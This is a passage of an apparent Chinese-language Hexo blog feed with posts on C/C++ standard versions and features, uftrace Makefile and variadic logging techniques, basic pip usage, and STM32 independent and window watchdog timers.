由美国国家标准协会（ANSI）于1989年发布的C语言标准，也被称作ANSI C。</p></li><li><p>C90 (ISO&#x2F;IEC 9899:1990)： 与C89基本相同，是C89在国际化上的延伸，由国际标准化组织（ISO）和国际电工委员会（IEC）于1990年采纳的C语言标准。</p></li><li><p>C95 (ISO&#x2F;IEC 9899:1995)： 是对ISO C90标准的一次修订，增加了一些新特性，例如支持多字节字符等。</p></li><li><p>C99 (ISO&#x2F;IEC 9899:1999)： 由ISO&#x2F;IEC在1999年采纳的新版C语言标准，新增了一些特性，如内联函数、边长数组、严格类型别名、具名结构初始化等。</p></li><li><p>C11 (ISO&#x2F;IEC 9899:2011)： 由ISO&#x2F;IEC于2011年发布的C语言标准，增加了更多的新特性，例如静态断言、通用结构初始器、匿名结构和联合等。</p></li><li><p>C17 (ISO&#x2F;IEC 9899:2018)： 于2018年发布的当前最新的C语言标准，主要修复了C11标准中的一些问题，没有引入新特性。</p></li></ul><h3 id="1-2-C-语言标准"><a href="#1-2-C-语言标准" class="headerlink" title="1.2 C++语言标准"></a>1.2 C++语言标准</h3><ul><li><p>C++98： 于1998年发布的C标准，是最早的国际标准化版本，包含了面向对象编程、模板等基本特性。</p></li><li><p>C++03： 于2003年发布，对C++98进行一些小修小补，主要是修复C++98的一些bug和漏洞。</p></li><li><p>C++11： 于2011年发布，被视为现代C++的开始，引入了多个重要特性，如自动类型推导、基于范围的 for 循环、Lambda 表达式、智能指针等。</p></li><li><p>C++14： 于2014年发布的C++标准，以更大的灵活性和性能优化为目标，引入了多个新特性，进行了增量式改进，例如泛型Lambda表达式、返回类型后置等。</p></li><li><p>C++17： 于2017年发布，进一步完善C++特性，如结构化绑定、并行算法库、内联变量等。</p></li><li><p>C++20： 最新的C标准，已经获得批准，编译器也已经开始支持其中的新特性。它引入了模块、概念、协程等重要特性 ，对C++语言进行了较大的扩展。</p></li></ul><p>这些标准制定了C语言和C++的基本规范，各个编译器需要支持这些标准以确保代码的正确执行和相互兼容。在实际编程过程中，需要根据所使用编译器的支持情况选择合适的标准。</p><h2 id="2-版本新特性"><a href="#2-版本新特性" class="headerlink" title="2. 版本新特性"></a>2. 版本新特性</h2><h3 id="2-1-C语言版本新特性"><a href="#2-1-C语言版本新特性" class="headerlink" title="2.1 C语言版本新特性"></a>2.1 C语言版本新特性</h3><ol><li><strong>C89&#x2F;90</strong></li></ol><ul><li><p>函数原型</p></li><li><p>const 限定符</p></li><li><p>volatile 限定符</p></li><li><p>enum 枚举类型</p></li><li><p>void 指针类型</p></li><li><p>单行注释，使用 <code>//</code></p></li></ul><ol start="2"><li><strong>C99</strong></li></ol><ul><li><p>可变长度数组（VLA）</p></li><li><p>行内函数 (inline)</p></li><li><p>类型宽度宏，如 <code>UINT32_MAX</code></p></li><li><p>严格的类型别名规则（strict aliasing）</p></li><li><p>灵活的数组成员 (Flexible Array Member)</p></li><li><p>复合文字 (Compound Literals)</p></li><li><p>布尔数据类型 <code>_Bool</code></p></li><li><p>复数和虚数数据类型</p></li></ul><ol start="3"><li><strong>C11</strong></li></ol><ul><li><p>多线程支持</p></li><li><p>原子操作</p></li><li><p>静态断言（Static assertions）</p></li><li><p>无类型泛型宏（Generic selection）</p></li><li><p>匿名结构和匿名联合</p></li><li><p>外部变量的对齐声明</p></li><li><p>类型泛化表达式</p></li></ul><h3 id="2-2-C-语言特性"><a href="#2-2-C-语言特性" class="headerlink" title="2.2 C++语言特性"></a>2.2 C++语言特性</h3><p>1） <strong>C++98</strong></p><ul><li><p>命名空间（namespaces）</p></li><li><p>类模板（class templates）</p></li><li><p>异常处理（exceptions）</p></li><li><p>运行时类型识别（RTTI）</p></li><li><p>标准模板库（STL）</p></li><li><p>bool 类型</p></li><li><p>类型转换操作符</p></li></ul><p>2） <strong>C++03</strong></p><p>在C++98基础上修复了一些bug和漏洞</p><p>3） <strong>C++11</strong></p><ul><li><p>自动类型推导（auto）</p></li><li><p>基于范围的 for 循环（Range-based for loops）</p></li><li><p>Lambda 表达式</p></li><li><p>右值引用和移动语义（Rvalue references and move semantics）</p></li><li><p>初始化列表（Initializer lists）</p></li><li><p>类型推断 decltype</p></li><li><p>constexpr 编译时计算</p></li><li><p>强类型枚举（Scoped enumerations）</p></li><li><p>nullptr为NULL的替代品</p></li><li><p>智能指针（shared_ptr, unique_ptr, weak_ptr）</p></li><li><p>并发编程（包括多线程的支持）</p></li></ul><p>4） <strong>C++14</strong></p><ul><li><p>泛型Lambda表达式</p></li><li><p>返回类型后置（函数返回类型推导）</p></li><li><p>二进制字面值</p></li><li><p>编译时整数序列（整数常量模板）</p></li><li><p>引入传递引用类型的函数</p></li><li><p>引入类型deprecated属性 (废弃声明)</p></li></ul><p>5） <strong>C++17</strong></p><ul><li><p>结构化绑定（Structured bindings）</p></li><li><p>并行算法库（Parallel algorithms）</p></li><li><p>内联变量（Inline variables）</p></li><li><p>文件系统库（Filesystem library）</p></li><li><p>变体类型（std::variant）</p></li><li><p>可选类型（std::optional）</p></li><li><p>任务型未来（std::future）</p></li></ul><ol start="6"><li><strong>C++20</strong></li></ol><ul><li><p>概念（Concepts）</p></li><li><p>范围（Ranges）</p></li><li><p>协程（Coroutines）</p></li><li><p>模块（Modules）</p></li><li><p>连续表述（constexpr features）</p></li><li><p>Lambda 表达式的优化</p></li><li><p>std::span 视图经常使用的一段连续内存</p></li><li><p>std::format 格式库</p></li></ul><p><strong>[参看]:</strong></p><ol><li><p><a href="https://cplusplus.com/reference/algorithm/sort/">cpluscpus reference</a></p></li><li><p><a href="https://en.cppreference.com/">cppreference</a></p></li><li><p><a href="https://blog.csdn.net/crr411422/article/details/125592160">C&#x2F;C++标准版本及不同版本的新特性</a></p></li><li><p><a href="https://blog.csdn.net/qq_65139309/article/details/130540716">深入剖析C++ 11新特性</a></p></li><li><p><a href="https://github.com/0voice/cpp_new_features">cpp_new_feature</a></p></li><li><p><a href="https://cpp.sh/">c++ shell</a></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对于开源项目的研究--uftrace</title>
    <link href="/2023/12/29/%E5%AF%B9%E4%BA%8E%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%A0%94%E7%A9%B6-uftrace/"/>
    <url>/2023/12/29/%E5%AF%B9%E4%BA%8E%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE%E7%9A%84%E7%A0%94%E7%A9%B6-uftrace/</url>
    
    <content type="html"><![CDATA[<p>总结开源项目 uftrace 中的编程技巧</p><span id="more"></span><h1 id="对于Makefile的研究"><a href="#对于Makefile的研究" class="headerlink" title="对于Makefile的研究"></a>对于Makefile的研究</h1><h2 id="简洁、美观的操作"><a href="#简洁、美观的操作" class="headerlink" title="简洁、美观的操作"></a>简洁、美观的操作</h2><p>编程不仅仅是对于功能上的实现，源码的简洁、明了也提高代码的可读性。通过对该项目的Makefile文件的研究，我发现了一下的操作可以提高代码的可读性。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs makefile">_TARGETS := uftrace python/uftrace_python.so<br>_TARGETS += <span class="hljs-variable">$(LIBMCOUNT_TARGETS)</span> libmcount/libmcount-nop.so<br>_TARGETS += misc/demangler misc/symbols misc/dbginfo<br>TARGETS  := <span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> %,<span class="hljs-variable">$(objdir)</span>/%,<span class="hljs-variable">$(_TARGETS)</span>)</span><br><br>UFTRACE_SRCS := <span class="hljs-variable">$(srcdir)</span>/uftrace.c <span class="hljs-variable">$(<span class="hljs-built_in">wildcard</span> <span class="hljs-variable">$(srcdir)</span>/cmds/*.c <span class="hljs-variable">$(srcdir)</span>/utils/*.c)</span><br>UFTRACE_OBJS := <span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> <span class="hljs-variable">$(srcdir)</span>/%.c,<span class="hljs-variable">$(objdir)</span>/%.o,<span class="hljs-variable">$(UFTRACE_SRCS)</span>)</span><br><br>UFTRACE_OBJS_VERSION := <span class="hljs-variable">$(objdir)</span>/cmds/script.o <span class="hljs-variable">$(objdir)</span>/cmds/tui.o<br>UFTRACE_OBJS_VERSION += <span class="hljs-variable">$(objdir)</span>/cmds/dump.o <span class="hljs-variable">$(objdir)</span>/cmds/info.o<br><br>DEMANGLER_SRCS := <span class="hljs-variable">$(srcdir)</span>/misc/demangler.c <span class="hljs-variable">$(srcdir)</span>/utils/demangle.c<br>DEMANGLER_SRCS += <span class="hljs-variable">$(srcdir)</span>/utils/debug.c <span class="hljs-variable">$(srcdir)</span>/utils/utils.c<br>DEMANGLER_OBJS := <span class="hljs-variable">$(<span class="hljs-built_in">patsubst</span> <span class="hljs-variable">$(srcdir)</span>/%.c,<span class="hljs-variable">$(objdir)</span>/%.o,<span class="hljs-variable">$(DEMANGLER_SRCS)</span>)</span><br><br>SYMBOLS_SRCS := <span class="hljs-variable">$(srcdir)</span>/misc/symbols.c <span class="hljs-variable">$(srcdir)</span>/utils/session.c<br>SYMBOLS_SRCS += <span class="hljs-variable">$(srcdir)</span>/utils/demangle.c <span class="hljs-variable">$(srcdir)</span>/utils/rbtree.c<br>SYMBOLS_SRCS += <span class="hljs-variable">$(srcdir)</span>/utils/utils.c <span class="hljs-variable">$(srcdir)</span>/utils/debug.c<br>SYMBOLS_SRCS += <span class="hljs-variable">$(srcdir)</span>/utils/filter.c <span class="hljs-variable">$(srcdir)</span>/utils/dwarf.c<br>SYMBOLS_SRCS += <span class="hljs-variable">$(srcdir)</span>/utils/auto-args.c <span class="hljs-variable">$(srcdir)</span>/utils/regs.c<br>SYMBOLS_SRCS += <span class="hljs-variable">$(srcdir)</span>/utils/argspec.c<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>通过上述代码，可以发现如果某个变量过长的话，应该要将其缩短。这里使用的方法就是通过<code>+=</code>来实现的。</p><p>在C语言中的符号<code>\</code>被专门用来连接上下两行。</p><h1 id="对于源代码的研究"><a href="#对于源代码的研究" class="headerlink" title="对于源代码的研究"></a>对于源代码的研究</h1><h2 id="关于提示消息的输入输出"><a href="#关于提示消息的输入输出" class="headerlink" title="关于提示消息的输入输出"></a>关于提示消息的输入输出</h2><p>在这个项目中使用<code>__attrabute__((nead)) static const uftrace_help []</code>来存储帮助信息。使用了<code>__attrabute__((nead))</code>来告诉编译器就算没有使用这个对象也不要优化它。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> __used __attribute__((used))</span><br><br>__used <span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span> uftrace_usage[] =<br><span class="hljs-string">&quot; uftrace -- function (graph) tracer for userspace\n&quot;</span><br><span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-string">&quot; usage: uftrace [COMMAND] [OPTION...] [&lt;program&gt;]\n&quot;</span><br><span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-string">&quot; COMMAND:\n&quot;</span><br><span class="hljs-string">&quot;   record          Run a program and saves the trace data\n&quot;</span><br><span class="hljs-string">&quot;   replay          Show program execution in the trace data\n&quot;</span><br><span class="hljs-string">&quot;   report          Show performance statistics in the trace data\n&quot;</span><br><span class="hljs-string">&quot;   live            Do record and replay in a row (default)\n&quot;</span><br><span class="hljs-string">&quot;   info            Show system and program info in the trace data\n&quot;</span><br><span class="hljs-string">&quot;   dump            Show low-level trace data\n&quot;</span><br><span class="hljs-string">&quot;   recv            Save the trace data from network\n&quot;</span><br><span class="hljs-string">&quot;   graph           Show function call graph in the trace data\n&quot;</span><br><span class="hljs-string">&quot;   script          Run a script for recorded trace data\n&quot;</span><br><span class="hljs-string">&quot;   tui             Show text user interface for graph and report\n&quot;</span><br><span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>然后使用变参函数<code>vprintf</code>将其输出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __pr_dbg(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)<br>&#123;<br>va_list ap;<br><br>color(TERM_COLOR_GRAY, logfp);<br><br>va_start(ap, fmt);<br><span class="hljs-built_in">vfprintf</span>(logfp, fmt, ap);<br>va_end(ap);<br><br>color(TERM_COLOR_RESET, logfp);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用该函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__pr_dbg(uftrace_usage);<br></code></pre></td></tr></table></figure><p>所以这里需要注意的是，虽然使用的是变参函数<code>printf</code>的变体，但是没有直接使用变参函数。而是使用<code>fmt</code>。</p><p>关于这个可变参数函数的用法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PR_FMT <span class="hljs-string">&quot;uftrace&quot;</span></span><br>__pr_dbg(PR_FMT <span class="hljs-string">&quot;: %s:%d:%s\n ERROR: &quot;</span> fmt, __FILE__, __LINE__, __func__, ##__VA_ARGS__)<br></code></pre></td></tr></table></figure><p>需要注意两点：</p><ul><li>在<code>fmt</code>之前还可以添加字符串</li><li><code>__VA_ARGS__</code>必之前须要添加<code>##</code></li></ul><h3 id="可变参数的其他使用"><a href="#可变参数的其他使用" class="headerlink" title="可变参数的其他使用"></a>可变参数的其他使用</h3><p>可以使用这中函数来输出日志；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__pr_dbg(<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记录使用pip下载出现的问题</title>
    <link href="/2023/12/29/%E8%AE%B0%E5%BD%95%E4%BD%BF%E7%94%A8pip%E4%B8%8B%E8%BD%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2023/12/29/%E8%AE%B0%E5%BD%95%E4%BD%BF%E7%94%A8pip%E4%B8%8B%E8%BD%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>记录pip包管理器的常见用法</p><span id="more"></span> <h1 id="什么是pip"><a href="#什么是pip" class="headerlink" title="什么是pip"></a>什么是pip</h1><p>pip是python2的一种包管理工具，pip3就是python3的管理工具。</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install SomePackage              <span class="hljs-comment"># 最新版本</span><br>pip install SomePackage==1.0.4       <span class="hljs-comment"># 指定版本</span><br>pip install <span class="hljs-string">&#x27;SomePackage&gt;=1.0.4&#x27;</span>     <span class="hljs-comment"># 最小版本</span><br></code></pre></td></tr></table></figure><p>卸载包</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip uninstall Packname<br></code></pre></td></tr></table></figure><h2 id="搜索包"><a href="#搜索包" class="headerlink" title="搜索包"></a>搜索包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip search Packname<br></code></pre></td></tr></table></figure><h2 id="列出安装的包"><a href="#列出安装的包" class="headerlink" title="列出安装的包"></a>列出安装的包</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">pip <span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p>很多时候直接使用pip会有超时的错误，这时我们可以设置超时限制，或者是直接更换源。</p><h2 id="设置超时限制"><a href="#设置超时限制" class="headerlink" title="设置超时限制:"></a>设置超时限制:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip --default-timeout=100 install  Packname<br></code></pre></td></tr></table></figure><p>暂时更换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple Django<br></code></pre></td></tr></table></figure><p>永久更换源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">pip install pip -U <span class="hljs-comment"># 先升级pip到最高版本</span><br>pip config <span class="hljs-built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.runoob.com/w3cnote/python-pip-install-usage.html">https://www.runoob.com/w3cnote/python-pip-install-usage.html</a></p><p><a href="https://blog.csdn.net/qq_39161804/article/details/81191977">https://blog.csdn.net/qq_39161804/article/details/81191977</a></p><p><a href="https://pypi.org/project/idna/">这个网站是pip的包</a></p>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stm32看门狗</title>
    <link href="/2023/12/27/stm32%E7%9C%8B%E9%97%A8%E7%8B%97/"/>
    <url>/2023/12/27/stm32%E7%9C%8B%E9%97%A8%E7%8B%97/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>看门狗</p><p>stm32中有两中看门狗，一种是独立看门狗、一种是窗口看门狗。独立看门狗的时间精度较低，适用于对时间没有要求的任务。可以将独立 看门狗看作是宠物狗，将窗口看门狗看作是警犬。</p><h1 id="独立看门狗-IWDG"><a href="#独立看门狗-IWDG" class="headerlink" title="独立看门狗(IWDG)"></a>独立看门狗(IWDG)</h1><p>之所以称之为“独立”是因为：独立看门狗的时钟由独立的RC振荡器LSI提供，即使主时钟发生故障它仍然有效。</p><p>独立看门狗的计数器是一个12位的递减计数器，最大值为0XFFF，当计数器减到0时，会产生一个复位信号:IWDG_RESET， 让程序重新启动运行，如果在计数器减到0之前刷新了计数器的值的话，就不会产生复位信号，重新刷新计数器值的这个动作我们俗称喂狗。</p><p>独立看门狗的简图：<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312271730577.png"></p><p>其中键寄存器就相当于控制寄存器一样。</p><p>设置多久之内需要喂狗（即重新刷新计数器值）：</p><p>重装载寄存器是一个12位的寄存器，里面装着要刷新到计数器的值，这个值的大小决定着独立看门狗的溢出时间。 超时时间<code>Tout = (4*2^prv) / 40 * rlv (s)</code> ，prv是预分频器寄存器的值，rlv是重装载寄存器的值。</p><h2 id="使用范围"><a href="#使用范围" class="headerlink" title="使用范围"></a>使用范围</h2><p>独立看门狗一般用来检测和解决由程序引起的故障，比如一个程序正常运行的时间是50ms， 在运行完这个段程序之后紧接着进行喂狗，我们设置独立看门狗的定时溢出时间为60ms，比我们需要监控的程序50ms多一点， 如果超过60ms还没有喂狗，那就说明我们监控的程序出故障了，跑飞了，那么就会产生系统复位，让程序重新运行。如果我们需要设置[n m]时间段之内是否喂狗的话则需要使用过窗口看门狗。</p><h2 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 使能 预分频寄存器PR和重装载寄存器RLR可写</span><br>IWDG_WriteAccessCmd( IWDG_WriteAccess_Enable );<br><br><span class="hljs-comment">// 设置预分频器值</span><br>IWDG_SetPrescaler( prv );<br><br><span class="hljs-comment">// 设置重装载寄存器值</span><br>IWDG_SetReload( rlv );<br><br><span class="hljs-comment">// 把重装载寄存器的值放到计数器中</span><br>IWDG_ReloadCounter();<br><br><span class="hljs-comment">// 使能 IWDG</span><br>IWDG_Enable();<br></code></pre></td></tr></table></figure><p>查看是否喂狗了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span>(RCC_GetFlagStatus(RCC_FLAG_IWDGRST) != RESET)&#123;<br>    <span class="hljs-comment">//没有喂狗</span><br>    ...<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    IWDG_ReloadCounter();<span class="hljs-comment">//喂狗，重新加载值到计数器中</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="窗口看门狗"><a href="#窗口看门狗" class="headerlink" title="窗口看门狗"></a>窗口看门狗</h1><p>可以设置一个时间段，而不单单是在某个时间之前。独立看门狗是当计数寄存器中的值减到0的话就会产生复位信号。但是窗口是变成<code>0x40</code>，而不是<code>0</code>，这被称之为窗口的下限，这个是固定的。上限是可以更改的，只要在上下限之间喂狗了就不会复位。这就是为什么称之为“窗口”。所以窗口看门狗需要在窗口中间将计数器的值进行刷新，就不会产生复位。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312271812813.png"></p><p>RLR是重装载寄存器，用来设置独立看门狗的计数器的值。TR是窗口看门狗的计数器的值，由用户独立设置，WR是窗口看门狗的上窗口值，由用户独立设置。</p><h2 id="窗口看门狗时钟"><a href="#窗口看门狗时钟" class="headerlink" title="窗口看门狗时钟"></a>窗口看门狗时钟</h2><p>这个外设的时钟是由PCLK1提供的，PCLK1最大是36M，由RCC时钟控制器开启。</p><h2 id="计数器时钟"><a href="#计数器时钟" class="headerlink" title="计数器时钟"></a>计数器时钟</h2><p>我们知道看门狗实际上就是一个计数器构成的，那么计数器改变一次需要多久的时间？</p><p>计数器时钟由CK计时器时钟经过预分频器分频得到，分频系数由配置寄存器CFR的位8:7  WDGTB[1:0]配置，可以是[0,1,2,3]，其中CK计 时器时钟&#x3D;PCLK1&#x2F;4096，除以4096是手册规定的，没有为什么。所以计数器的时钟<code>CNT_CK=PCLK1/4096/(2^WDGTB)，</code><br>这就可以算出计数器减一个数的时间<code>T= 1/CNT_CK = PCLK1 * 4096 * (2^WDGTB)</code>。</p><p>这个<code>WDGTB</code>是预分频数，可以是[0,1,2,3]，后面会讲到一个设置预分频数的函数<code>WWDG_SetPrescaler()</code>可以设置这个值，但是其参数是[1,2,4,8]这里我们将它们一一对应即可。</p><h2 id="死前中断"><a href="#死前中断" class="headerlink" title="死前中断"></a>死前中断</h2><p>窗口看门狗的计数器是一个递减计数器，共有7位，其值存在控制寄存器CR的位6:0，即T[6:0]，当7个位全部为1时是0X7F，这个是最大值，当递减到T6位变成0时，即从0X40变为0X3F时候，会产生看门狗复位。这个值0X40是看门狗能够递减到的最小值，所以计数器的值只能是：0X40~0X7F之间，实际上真正用来计数的是T[5:0]。当递减计数器递减到0X40的时候，还不会马上产生复位，如果使能了提前唤醒中断：CFR位9 EWI 置1，则产生提前唤醒中断，如果真进入了这个中断的话，就说明程序肯定是出问题了。</p><p>那么在中断服务程序里面我们就需要做最重要的工作，比如保存重要数据，或者报警等，这个中断我们也叫它死前中断。</p><h2 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h2><p>上面我们知道，使用窗口看门狗的话必须要在窗口中间进行复位，不可以是窗口之前也不可以是窗口之后。</p><p>所以我们需要知道程序的具体执行时间，才好设置上窗口的值。</p><h3 id="窗口看门狗函数"><a href="#窗口看门狗函数" class="headerlink" title="窗口看门狗函数"></a>窗口看门狗函数</h3><p>在标准库中提供了以下函数, 我们具体来说明每一个函数的作用. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_DeInit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//重新初始化</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_SetPrescaler</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> WWDG_Prescaler)</span>;<span class="hljs-comment">//设置看门狗的使用分频值由1 2 4 8 四个选项</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_SetWindowValue</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> WindowValue)</span>;<span class="hljs-comment">//设置上窗口值</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_EnableIT</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//开启死前中断</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_SetCounter</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> Counter)</span>;<span class="hljs-comment">//设置号计数器的值</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_Enable</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> Counter)</span>;<span class="hljs-comment">//开启窗口看门狗</span><br>FlagStatus <span class="hljs-title function_">WWDG_GetFlagStatus</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//获取中断信息位</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">WWDG_ClearFlag</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<span class="hljs-comment">//去除中断信息位</span><br></code></pre></td></tr></table></figure><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WWDG 配置函数</span><br><span class="hljs-comment"> * tr ：递减计时器的值， 取值范围为：0x7f~0x40</span><br><span class="hljs-comment"> * wr ：窗口值，取值范围为：0x7f~0x40</span><br><span class="hljs-comment"> * prv：预分频器值，取值可以是</span><br><span class="hljs-comment"> *      @arg WWDG_Prescaler_1: WWDG counter clock = (PCLK1(36MHZ)/4096)/1</span><br><span class="hljs-comment"> *      @arg WWDG_Prescaler_2: WWDG counter clock = (PCLK1(36mhz)/4096)/2</span><br><span class="hljs-comment"> *      @arg WWDG_Prescaler_4: WWDG counter clock = (PCLK1(36mhz)/4096)/4</span><br><span class="hljs-comment"> *      @arg WWDG_Prescaler_8: WWDG counter clock = (PCLK1(36mhz)/4096)/8</span><br><span class="hljs-comment"> */</span><br><span 